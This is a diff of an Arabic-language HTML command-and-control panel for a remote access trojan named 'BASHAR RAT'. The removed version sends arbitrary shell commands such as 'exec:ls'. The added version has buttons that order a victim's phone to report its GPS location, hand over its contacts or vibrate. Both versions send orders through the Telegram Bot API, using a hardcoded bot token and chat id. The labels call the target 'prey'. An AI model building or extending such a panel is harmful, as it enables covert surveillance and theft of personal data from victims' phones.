@@ -1,37 +1,12 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>BASHAR C2 PANEL</title>
-    <style>
-        body { background: #000; color: #ff0000; font-family: monospace; padding: 20px; }
-        .box { border: 1px solid #ff0000; padding: 20px; border-radius: 5px; box-shadow: 0 0 15px #ff0000; }
-        input { width: 100%; padding: 10px; background: #111; border: 1px solid #333; color: #0f0; margin: 10px 0; }
-        button { width: 100%; padding: 15px; background: #ff0000; color: #fff; border: none; cursor: pointer; font-weight: bold; }
-        .log { margin-top: 20px; font-size: 12px; color: #888; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h2>💀 BASHAR RAT SYSTEM</h2>
-        <label>أدخل الأمر البرمجي (مثلاً: exec:ls أو exec:pwd):</label>
-        <input type="text" id="command" placeholder="exec:ls">
-        <button onclick="sendCommand()">إرسال الأمر للصيد الثمين ⚡</button>
-        <div class="log" id="log">في انتظار تنفيذ الأمر...</div>
-    </div>
+<button onclick="send('vibrate')">هز الهاتف 📳</button>
+<button onclick="send('get_gps')">تحديد الموقع 📍</button>
+<button onclick="send('get_contacts')">سحب الأسماء 📞</button>
 
-    <script>
-        function sendCommand() {
-            const cmd = document.getElementById('command').value;
-            const token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-            const chat_id = "7214473798";
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(cmd)}`)
-            .then(() => {
-                document.getElementById('log').innerHTML += `<br>> [SENT]: ${cmd}`;
-                alert("تم إرسال الأمر بنجاح!");
-            });
-        }
-    </script>
-</body>
-</html>
+<script>
+function send(cmd) {
+    const token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+    const chat_id = "7214473798";
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${cmd}`);
+    alert("تم إرسال الأمر: " + cmd);
+}
+</script>
